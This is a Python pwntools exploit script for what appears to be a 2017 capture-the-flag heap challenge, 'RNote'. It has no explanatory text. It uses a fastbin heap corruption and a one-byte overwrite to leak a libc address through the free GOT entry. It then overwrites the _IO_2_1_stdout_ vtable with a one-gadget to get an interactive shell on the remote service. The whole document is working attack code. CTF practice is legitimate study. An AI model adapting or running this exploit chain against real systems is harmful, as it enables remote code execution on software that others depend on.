from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'rnote.2017.teamrois.cn', 7777
libc = ELF('/=/Downloads/RNote/libc.so.6')
r = remote(HOST, PORT)
menu = lambda: r.recvuntil(': ')
ii = lambda x: r.send(str(x).ljust(16))

size = 0x30
next = 0x602070 + 2 - 8

stdout = 0x6020e0 + 32 * 8 + 0x18 - 0xd8
payload = 'a' * (0x6020a0 - 0x60207a) + p64(0x67)
lsb = 0x10

def go(next, size, payload, lsb, base, order=range(3)):
	menu()
	ii(1)
	menu()
	ii(size)
	menu()
	r.sendline('')
	menu()
	r.sendline('')

	menu()
	ii(1)
	menu()
	ii(size)
	menu()
	r.sendline('')
	menu()
	r.sendline('')

	menu()
	ii(1)
	menu()
	ii(size)
	menu()
	r.send('a' * 16 + chr(lsb))
	menu()
	r.sendline('')

	for c in order:
		menu()
		ii(2)
		menu()
		ii(c+base)

	menu()
	ii(1)
	menu()
	ii(size)
	menu()
	r.sendline('')
	menu()
	r.sendline(p64(next))

	menu()
	ii(1)
	menu()
	ii(size)
	menu()
	r.sendline('')
	menu()
	r.sendline(p64(next))

	menu()
	ii(1)
	menu()
	ii(size)
	menu()
	r.sendline('')
	menu()
	r.sendline(p64(next))

	menu()
	ii(1)
	menu()
	ii(size)
	menu()
	r.sendline('')
	menu()
	r.send(payload)

go(next, size, payload, lsb, 0)

menu()
ii(1)
menu()
ii(0x30)
menu()
r.sendline('')
menu()
r.sendline('')

next = 0x6020a0 - 8
size = 0x58
lsb = 0x10
payload = 'a' * (0x6020e0 - 0x6020a8) + p32(1) + p32(8) + '\x00' * 16 + p64(0x602018)
go(next, size, payload, lsb, 5)

menu()
ii(3)
menu()
ii(0)

r.recvuntil('content: ')
data = r.recvline()[:-1]
free = data[:8].ljust(8, '\x00')
free = u64(free)

libc.address = free - libc.symbols['free']
gadget = libc.address + 0xf0567

print hex(libc.address)
print hex(free)

next = libc.symbols['_IO_2_1_stdout_'] + 160 + 5 - 8
size = 0x60
lsb = 0x10

for i in range(2):
	menu()
	ii(1)
	menu()
	ii(0x60)
	menu()
	r.sendline('')
	menu()
	r.sendline('')

vtable = libc.symbols['_IO_2_1_stdout_'] + 0xe0
payload = '\x00' * (0xf8 - 0xcd) + p64(vtable - 0x38) + p64(gadget)

go(next, size, payload, lsb, 11)

r.sendline('')
r.interactive()